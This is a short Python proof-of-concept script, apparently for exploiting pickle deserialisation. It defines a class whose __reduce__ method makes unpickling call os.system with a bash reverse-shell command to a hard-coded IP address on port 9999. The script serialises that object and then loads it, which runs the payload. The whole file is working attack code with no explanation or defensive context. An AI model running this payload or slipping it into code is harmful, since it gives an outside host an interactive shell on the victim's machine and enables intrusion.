#!/usr/bin/env python
import pickle
import os
class shell(object):
    def __reduce__(self):
        a = "bash -c 'bash -i >& /dev/tcp/140.112.90.54/9999 0>&1'"
        return (os.system, (a,))    

result = pickle.dumps(shell())
print(result)
# with open('ser_obj', 'wb') as file:
    # file.write(bytearray(result))

pickle.loads(result)
